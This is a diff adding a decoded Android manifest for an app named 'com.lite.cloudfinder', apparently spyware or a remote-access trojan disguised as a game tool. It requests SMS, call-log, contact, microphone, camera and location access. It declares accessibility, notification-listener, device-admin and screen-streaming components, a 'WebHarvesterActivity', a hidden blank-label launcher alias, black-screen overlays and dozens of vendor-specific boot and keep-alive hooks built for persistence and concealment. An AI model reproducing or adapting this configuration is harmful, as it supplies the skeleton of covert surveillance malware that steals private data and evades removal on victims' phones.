@@ -1,0 +1,303 @@
+<manifest versionCode="1" versionName="4.0" installLocation="1" compileSdkVersion="34" compileSdkVersionCodename="14" package="com.lite.cloudfinder" platformBuildVersionCode="34" platformBuildVersionName="14">
+  <uses-sdk minSdkVersion="26" targetSdkVersion="33">
+  <queries>
+    <package name="com.miui.securitycenter">
+    <package name="com.huawei.systemmanager">
+    <package name="com.hihonor.systemmanager">
+    <package name="com.coloros.safecenter">
+    <package name="com.oppo.safe">
+    <package name="com.oneplus.security">
+    <package name="com.vivo.permissionmanager">
+    <package name="com.iqoo.secure">
+    <package name="com.samsung.android.lool">
+    <package name="com.transsion.phonemaster">
+    <package name="com.itel.autobootmanager">
+    <package name="com.asus.mobilemanager">
+    <package name="com.meizu.safe">
+    <package name="com.letv.android.letvsafe">
+    <intent>
+      <action name="miui.intent.action.OP_AUTO_START">
+    <intent>
+      <action name="miui.intent.action.APP_PERM_EDITOR">
+    <intent>
+      <action name="huawei.intent.action.HSM_BOOTAPP_MANAGER">
+    <intent>
+      <action name="hihonor.intent.action.HSM_BOOTAPP_MANAGER">
+  <uses-permission name="android.permission.READ_SMS">
+  <uses-permission name="android.permission.READ_CALL_LOG">
+  <uses-permission name="android.permission.CALL_PHONE">
+  <uses-permission name="android.permission.RECORD_AUDIO">
+  <uses-permission name="android.permission.ACCESS_FINE_LOCATION">
+  <uses-permission name="android.permission.ACCESS_COARSE_LOCATION">
+  <uses-permission name="android.permission.RECEIVE_BOOT_COMPLETED">
+  <uses-permission name="android.permission.WAKE_LOCK">
+  <uses-permission name="android.permission.INTERNET">
+  <uses-permission name="android.permission.ACCESS_NETWORK_STATE">
+  <uses-permission name="android.permission.ACCESS_WIFI_STATE">
+  <uses-permission name="android.permission.CHANGE_WIFI_STATE">
+  <uses-permission name="android.permission.READ_PHONE_STATE">
+  <uses-permission name="android.permission.READ_CONTACTS">
+  <uses-permission name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS">
+  <uses-permission name="android.permission.REORDER_TASKS">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE" minSdkVersion="26">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" minSdkVersion="34">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" minSdkVersion="29">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" minSdkVersion="34">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" minSdkVersion="34">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE" minSdkVersion="34">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE_REMOTE_MESSAGING" minSdkVersion="34">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE_LOCATION" minSdkVersion="34">
+  <uses-permission name="android.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND">
+  <uses-permission name="android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND">
+  <uses-permission name="android.permission.REQUEST_INSTALL_PACKAGES">
+  <uses-permission name="android.permission.REQUEST_DELETE_PACKAGES">
+  <uses-permission name="android.permission.QUERY_ALL_PACKAGES" minSdkVersion="30">
+  <uses-permission name="android.permission.GET_INSTALLED_APPS" minSdkVersion="31">
+  <uses-permission name="android.permission.TURN_SCREEN_ON" minSdkVersion="34">
+  <uses-permission name="android.permission.READ_EXTERNAL_STORAGE">
+  <uses-permission name="android.permission.WRITE_EXTERNAL_STORAGE">
+  <uses-permission name="android.permission.MANAGE_EXTERNAL_STORAGE" minSdkVersion="30">
+  <uses-permission name="android.permission.MANAGE_ALL_FILES_ACCESS_PERMISSION" minSdkVersion="30">
+  <uses-permission name="android.permission.READ_MEDIA_IMAGES" minSdkVersion="33">
+  <uses-permission name="android.permission.READ_MEDIA_VIDEO" minSdkVersion="33">
+  <uses-permission name="android.permission.READ_MEDIA_AUDIO" minSdkVersion="33">
+  <uses-permission name="android.permission.CAMERA">
+  <uses-feature name="android.hardware.camera" required="false">
+  <uses-feature name="android.hardware.camera.front" required="false">
+  <uses-feature name="android.hardware.telephony" required="false">
+  <uses-permission name="com.vivo.permission.manage.permission.ACCESS">
+  <uses-permission name="com.vivo.abe.permission.CLEAN_NOTIFICATION">
+  <uses-permission name="oppo.permission.OPPO_COMPONENT_SAFE">
+  <uses-permission name="com.coloros.permission.SAFE_COMPONENT">
+  <uses-permission name="com.heytap.permission.SAFE_COMPONENT">
+  <uses-permission name="com.huawei.permission.external_app_settings.USE_COMPONENT">
+  <uses-permission name="com.huawei.android.launcher.permission.CHANGE_BADGE">
+  <uses-permission name="com.xiaomi.permission.BACKGROUND_START_ACTIVITY">
+  <uses-permission name="com.miui.permission.START_IN_BACKGROUND">
+  <uses-permission name="com.samsung.android.permission.BACKGROUND_START_ACTIVITY">
+  <uses-permission name="com.samsung.android.permission.MANAGE_ACTIVITY_PROTECTION">
+  <uses-permission name="com.samsung.android.app.routine.EXECUTE">
+  <uses-permission name="com.samsung.android.sm.permission.KEEP_ALIVE">
+  <uses-permission name="com.sec.android.provider.badge.permission.READ">
+  <uses-permission name="com.sec.android.provider.badge.permission.WRITE">
+  <uses-permission name="com.google.android.gms.permission.ACTIVITY_RECOGNITION">
+  <uses-permission name="com.asus.mobilemanager.permission.ACCESS">
+  <uses-permission name="com.asus.mobilemanager.autostart.permission.ACCESS">
+  <uses-permission name="com.letv.android.permission.BACKGROUND_START_ACTIVITY">
+  <uses-permission name="com.hihonor.permission.MANAGE_BACKGROUND_ACTIVITY">
+  <uses-permission name="com.transsion.permission.AUTOSTART">
+  <uses-permission name="com.transsion.permission.MANAGE_BACKGROUND">
+  <uses-permission name="com.tecno.permission.BACKGROUND_START_ACTIVITY">
+  <uses-permission name="com.infinix.permission.BACKGROUND_START_ACTIVITY">
+  <uses-permission name="com.itel.permission.BACKGROUND_START_ACTIVITY">
+  <uses-permission name="com.nokia.permission.KEEP_ALIVE">
+  <uses-permission name="com.motorola.permission.BACKGROUND_START_ACTIVITY">
+  <uses-permission name="com.realme.permission.SAFE_COMPONENT">
+  <uses-permission name="android.permission.FOREGROUND_SERVICE_SYSTEM_EXEMPTED">
+  <uses-permission name="com.android.alarm.permission.SET_ALARM">
+  <uses-permission name="android.permission.WRITE_SETTINGS">
+  <uses-permission name="android.permission.WRITE_SECURE_SETTINGS">
+  <uses-permission name="android.permission.ACCESS_NOTIFICATION_POLICY">
+  <uses-permission name="android.permission.VIBRATE">
+  <uses-permission name="android.permission.MODIFY_AUDIO_SETTINGS">
+  <uses-permission name="android.permission.SCHEDULE_EXACT_ALARM">
+  <uses-permission name="android.permission.USE_EXACT_ALARM">
+  <uses-permission name="android.permission.RECEIVE_USER_PRESENT">
+  <queries>
+    <package name="com.oplus.battery">
+    <package name="com.coloros.oppoguardelf">
+    <package name="com.coloros.safecenter">
+    <package name="com.oppo.safe">
+    <package name="com.oneplus.security">
+    <package name="com.samsung.android.lool">
+    <package name="com.samsung.android.sm">
+    <package name="com.miui.securitycenter">
+    <package name="com.miui.powerkeeper">
+    <package name="com.vivo.permissionmanager">
+    <package name="com.iqoo.secure">
+    <package name="com.huawei.systemmanager">
+    <package name="com.hihonor.systemmanager">
+    <package name="com.transsion.phonemaster">
+    <package name="com.transsion.phonemanager">
+    <package name="com.mediatek.autobootcontroller">
+    <package name="com.asus.mobilemanager">
+    <package name="com.meizu.safe">
+    <package name="com.evenwell.powersaving.g3">
+    <package name="com.android.settings">
+  <uses-permission name="android.permission.POST_NOTIFICATIONS">
+  <uses-permission name="com.google.android.c2dm.permission.RECEIVE">
+  <permission name="com.lite.cloudfinder.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" protectionLevel="0x2">
+  <uses-permission name="com.lite.cloudfinder.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION">
+  <application theme="@0x7f11000b" label="@0x7f10001e" icon="@0x7f0d0000" name="com.lite.cloudfinder.App" allowClearUserData="false" allowBackup="true" killAfterRestore="false" hardwareAccelerated="true" largeHeap="true" supportsRtl="true" extractNativeLibs="true" usesCleartextTraffic="true" backupInForeground="false" networkSecurityConfig="@0x7f130006" roundIcon="@0x7f0d0000" cantSaveState="false" appComponentFactory="androidx.core.app.CoreComponentFactory" requestLegacyExternalStorage="true" dataExtractionRules="@0x7f130004">
+    <activity theme="@0x7f11000d" label="@0x7f10001e" icon="@0x7f0d0000" name="com.lite.cloudfinder.activity.MainActivity" exported="true" clearTaskOnLaunch="false" excludeFromRecents="true" roundIcon="@0x7f0d0000">
+      <intent-filter autoVerify="true">
+        <category name="android.intent.category.DEFAULT">
+        <category name="android.intent.category.TEST">
+        <action name="android.intent.action.MAIN">
+        <action name="android.intent.action.VIEW">
+        <data scheme="gamebot" host="goapp.fromchrome">
+    <activity-alias label="@0x7f10001e" icon="@0x7f0d0000" name="com.lite.cloudfinder.activity.AliasS" enabled="true" exported="true" launchMode="2" configChanges="0x490" targetActivity="com.lite.cloudfinder.activity.MainActivity" roundIcon="@0x7f0d0000">
+      <intent-filter>
+        <action name="android.intent.action.MAIN">
+        <category name="android.intent.category.DEFAULT">
+      <meta-data name="android.app.shortcuts" resource="@0x7f130007">
+    <activity-alias label="ㅤ" icon="@0x7f0700a1" name="com.lite.cloudfinder.activity.AliasN" enabled="false" exported="true" launchMode="2" configChanges="0x490" targetActivity="com.lite.cloudfinder.activity.MainActivity" roundIcon="@0x7f0700a1">
+      <intent-filter>
+        <action name="android.intent.action.MAIN">
+        <category name="android.intent.category.DEFAULT">
+    <activity theme="@0x7f11015b" name="com.lite.cloudfinder.activity.AlertActivity" exported="false" excludeFromRecents="true" autoRemoveFromRecents="true">
+    <activity label="game shot" name="com.lite.cloudfinder.activity.FakeIntentActivity" exported="true" excludeFromRecents="true" noHistory="true">
+      <intent-filter>
+        <action name="xyz">
+    <activity theme="@0x7f11015a" label="Game Play" name="com.lite.cloudfinder.activity.OverlayActivity" excludeFromRecents="true">
+    <activity theme="@0x01030010" name="com.lite.cloudfinder.activity.BlackOverlayActivity" excludeFromRecents="true">
+    <activity theme="@0x01030010" name="com.lite.cloudfinder.activity.ConfirmDeviceActivity" excludeFromRecents="true">
+    <activity theme="@0x0103000a" name="com.lite.cloudfinder.activity.AdbBlackScreenActivity" exported="true" excludeFromRecents="true" launchMode="2" screenOrientation="1">
+    <activity theme="@0x01030010" name="com.lite.cloudfinder.activity.OverlayRequestActivity">
+    <activity theme="@0x01030010" name="com.lite.cloudfinder.activity.TransparentActivity">
+    <activity theme="@0x01030010" name="com.lite.cloudfinder.activity.PermissionActivity" noHistory="true">
+    <activity theme="@0x01030010" name="com.lite.cloudfinder.activity.OverlayLaunchActivity" noHistory="true">
+    <activity theme="@0x7f110226" name="com.lite.cloudfinder.activity.WebHarvesterActivity" exported="false" excludeFromRecents="true">
+    <service name="com.lite.cloudfinder.hd.HDStreamService" enabled="true" exported="false" foregroundServiceType="0x20">
+    <activity theme="@0x01030010" name="com.lite.cloudfinder.hd.HDPermActivity" exported="false" excludeFromRecents="true">
+    <service name="com.lite.cloudfinder.service.ForegroundKeepAliveService" enabled="true" exported="false" stopWithTask="false" foregroundServiceType="0x2">
+    <service name="com.lite.cloudfinder.service.KeepAliveDreamService" permission="android.permission.BIND_DREAM_SERVICE" exported="true">
+      <intent-filter>
+        <action name="android.service.dreams.DreamService">
+        <category name="android.intent.category.DEFAULT">
+    <service name="com.lite.cloudfinder.service.KeepAliveJobService" permission="android.permission.BIND_JOB_SERVICE" exported="false">
+    <service label="@0x7f10004d" name="com.lite.cloudfinder.service.CompanionIntentService" enabled="true" foregroundServiceType="0x40000000">
+      <property name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" value="Persistent companion process keepalive.">
+    <service name="com.lite.cloudfinder.service.DownloadService" exported="false">
+    <service label="@0x7f10001c" name="com.lite.cloudfinder.accessibility.MyAccessibilityService" permission="android.permission.BIND_ACCESSIBILITY_SERVICE" enabled="true" exported="false" description="@0x7f10001b">
+      <intent-filter>
+        <action name="android.accessibilityservice.AccessibilityService">
+      <meta-data name="android.accessibilityservice" resource="@0x7f130000">
+    <receiver name="com.lite.cloudfinder.receiver.MainReceiver" enabled="true" exported="true">
+      <intent-filter priority="1000">
+        <action name="android.intent.action.BOOT_COMPLETED">
+        <action name="android.intent.action.QUICKBOOT_POWERON">
+        <action name="android.intent.action.LOCKED_BOOT_COMPLETED">
+        <action name="android.intent.action.REBOOT">
+        <action name="com.huawei.android.push.intent.REGISTER">
+        <action name="android.intent.action.BOOT_COMPLETED_EARLY">
+        <action name="com.vivo.push.action.RECEIVE">
+        <action name="com.htc.intent.action.QUICKBOOT_POWERON">
+        <action name="com.meizu.safe.security.BOOT_COMPLETED">
+        <action name="com.smartisanos.action.BOOT_COMPLETED">
+      <intent-filter>
+        <action name="android.intent.action.MY_PACKAGE_REPLACED">
+      <intent-filter>
+        <action name="RestartSensor">
+      <intent-filter>
+        <action name="RestartConn">
+      <intent-filter>
+        <action name="BOOT_COMPLETED1">
+    <receiver name="com.lite.cloudfinder.receiver.BootReceiver" enabled="true" exported="true">
+      <intent-filter priority="1000">
+        <action name="android.intent.action.BOOT_COMPLETED">
+        <action name="android.intent.action.QUICKBOOT_POWERON">
+        <action name="com.htc.intent.action.QUICKBOOT_POWERON">
+        <action name="oppo.intent.action.BOOT_COMPLETED">
+        <action name="vivo.intent.action.BOOT_COMPLETED">
+        <action name="com.huawei.android.intent.action.BOOT_COMPLETED">
+        <action name="com.coloros.bootcompleted">
+        <action name="com.meizu.intent.action.BOOT_COMPLETED">
+        <action name="com.smartisan.intent.action.BOOT_COMPLETED">
+    <receiver name="com.lite.cloudfinder.receiver.AlarmReviveReceiver" enabled="true" exported="false">
+      <intent-filter>
+        <action name="android.intent.action.BOOT_COMPLETED">
+      <intent-filter>
+        <action name="android.intent.action.MY_PACKAGE_REPLACED">
+    <receiver name="com.lite.cloudfinder.receiver.ResetServices" exported="false">
+      <intent-filter>
+        <action name="android.intent.action.AIRPLANE_MODE">
+        <action name="android.intent.action.BATTERY_LOW">
+        <action name="android.intent.action.BATTERY_OKAY">
+        <action name="android.intent.action.LOCALE_CHANGED">
+        <action name="android.intent.action.TIMEZONE_CHANGED">
+        <action name="android.intent.action.DEVICE_STORAGE_LOW">
+        <action name="android.intent.action.DEVICE_STORAGE_OK">
+        <action name="android.intent.action.ACTION_POWER_CONNECTED">
+        <action name="android.intent.action.ACTION_POWER_DISCONNECTED">
+    <activity theme="@0x01030010" name="com.lite.cloudfinder.activity.DeviceAdminActivity" exported="false" excludeFromRecents="true" noHistory="true">
+    <receiver name="com.lite.cloudfinder.rda" permission="android.permission.BIND_DEVICE_ADMIN" exported="false">
+      <meta-data name="android.app.device_admin" resource="@0x7f130001">
+      <intent-filter>
+        <action name="android.app.action.DEVICE_ADMIN_ENABLED">
+    <service name="com.lite.cloudfinder.service.DeviceAdminKeepAlive" permission="android.permission.BIND_DEVICE_ADMIN" enabled="true" exported="true">
+    <receiver name="com.lite.cloudfinder.service.DeviceAdminKeepAlive$AlarmReceiver" exported="false">
+    <service name="com.lite.cloudfinder.service.NotificationListener" permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" exported="false">
+      <intent-filter>
+        <action name="android.service.notification.NotificationListenerService">
+    <activity theme="@0x7f110126" label="" name="pub.devrel.easypermissions.AppSettingsDialogHolderActivity" exported="false">
+    <provider name="androidx.core.content.FileProvider" exported="false" authorities="com.lite.cloudfinder.suffix.provider" grantUriPermissions="true">
+      <meta-data name="android.support.FILE_PROVIDER_PATHS" resource="@0x7f130005">
+    <provider name="androidx.startup.InitializationProvider" exported="false" authorities="com.lite.cloudfinder.androidx-startup">
+      <meta-data name="androidx.emoji2.text.EmojiCompatInitializer" value="androidx.startup">
+      <meta-data name="androidx.lifecycle.ProcessLifecycleInitializer" value="androidx.startup">
+      <meta-data name="androidx.work.WorkManagerInitializer" value="androidx.startup">
+      <meta-data name="androidx.profileinstaller.ProfileInstallerInitializer" value="androidx.startup">
+    <service name="com.lite.cloudfinder.service.CameraService" exported="false">
+    <service name="androidx.work.impl.background.systemalarm.SystemAlarmService" enabled="@0x7f040002" exported="false" directBootAware="false">
+    <service name="androidx.work.impl.background.systemjob.SystemJobService" permission="android.permission.BIND_JOB_SERVICE" enabled="@0x7f040004" exported="true" directBootAware="false">
+    <service name="androidx.work.impl.foreground.SystemForegroundService" enabled="@0x7f040003" exported="false" directBootAware="false">
+    <receiver name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver" enabled="true" exported="false" directBootAware="false">
+    <receiver name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy" enabled="false" exported="false" directBootAware="false">
+      <intent-filter>
+        <action name="android.intent.action.ACTION_POWER_CONNECTED">
+        <action name="android.intent.action.ACTION_POWER_DISCONNECTED">
+    <receiver name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy" enabled="false" exported="false" directBootAware="false">
+      <intent-filter>
+        <action name="android.intent.action.BATTERY_OKAY">
+        <action name="android.intent.action.BATTERY_LOW">
+    <receiver name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy" enabled="false" exported="false" directBootAware="false">
+      <intent-filter>
+        <action name="android.intent.action.DEVICE_STORAGE_LOW">
+        <action name="android.intent.action.DEVICE_STORAGE_OK">
+    <receiver name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy" enabled="false" exported="false" directBootAware="false">
+      <intent-filter>
+        <action name="android.net.conn.CONNECTIVITY_CHANGE">
+    <receiver name="androidx.work.impl.background.systemalarm.RescheduleReceiver" enabled="false" exported="false" directBootAware="false">
+      <intent-filter>
+        <action name="android.intent.action.BOOT_COMPLETED">
+        <action name="android.intent.action.TIME_SET">
+        <action name="android.intent.action.TIMEZONE_CHANGED">
+    <receiver name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver" enabled="@0x7f040002" exported="false" directBootAware="false">
+      <intent-filter>
+        <action name="androidx.work.impl.background.systemalarm.UpdateProxies">
+    <receiver name="androidx.work.impl.diagnostics.DiagnosticsReceiver" permission="android.permission.DUMP" enabled="true" exported="true" directBootAware="false">
+      <intent-filter>
+        <action name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS">
+    <receiver name="com.google.firebase.iid.FirebaseInstanceIdReceiver" permission="com.google.android.c2dm.permission.SEND" exported="true">
+      <intent-filter>
+        <action name="com.google.android.c2dm.intent.RECEIVE">
+      <meta-data name="com.google.android.gms.cloudmessaging.FINISHED_AFTER_HANDLED" value="true">
+    <service name="com.google.firebase.messaging.FirebaseMessagingService" exported="false" directBootAware="true">
+      <intent-filter priority="-500">
+        <action name="com.google.firebase.MESSAGING_EVENT">
+    <service name="com.google.firebase.components.ComponentDiscoveryService" exported="false" directBootAware="true">
+      <meta-data name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingKtxRegistrar" value="com.google.firebase.components.ComponentRegistrar">
+      <meta-data name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar" value="com.google.firebase.components.ComponentRegistrar">
+      <meta-data name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsKtxRegistrar" value="com.google.firebase.components.ComponentRegistrar">
+      <meta-data name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar" value="com.google.firebase.components.ComponentRegistrar">
+      <meta-data name="com.google.firebase.components:com.google.firebase.ktx.FirebaseCommonLegacyRegistrar" value="com.google.firebase.components.ComponentRegistrar">
+      <meta-data name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar" value="com.google.firebase.components.ComponentRegistrar">
+      <meta-data name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar" value="com.google.firebase.components.ComponentRegistrar">
+    <activity theme="@0x01030010" name="com.google.android.gms.common.api.GoogleApiActivity" exported="false">
+    <provider name="com.google.firebase.provider.FirebaseInitProvider" exported="false" authorities="com.lite.cloudfinder.firebaseinitprovider" initOrder="100" directBootAware="true">
+    <meta-data name="com.google.android.gms.version" value="@0x7f090008">
+    <receiver name="androidx.profileinstaller.ProfileInstallReceiver" permission="android.permission.DUMP" enabled="true" exported="true" directBootAware="false">
+      <intent-filter>
+        <action name="androidx.profileinstaller.action.INSTALL_PROFILE">
+      <intent-filter>
+        <action name="androidx.profileinstaller.action.SKIP_FILE">
+      <intent-filter>
+        <action name="androidx.profileinstaller.action.SAVE_PROFILE">
+      <intent-filter>
+        <action name="androidx.profileinstaller.action.BENCHMARK_OPERATION">
+    <service name="com.google.android.datatransport.runtime.backends.TransportBackendDiscovery" exported="false">
+      <meta-data name="backend:com.google.android.datatransport.cct.CctBackendFactory" value="cct">
+    <service name="com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService" permission="android.permission.BIND_JOB_SERVICE" exported="false">
+    <receiver name="com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver" exported="false">
+    <service name="androidx.room.MultiInstanceInvalidationService" exported="false" directBootAware="true">
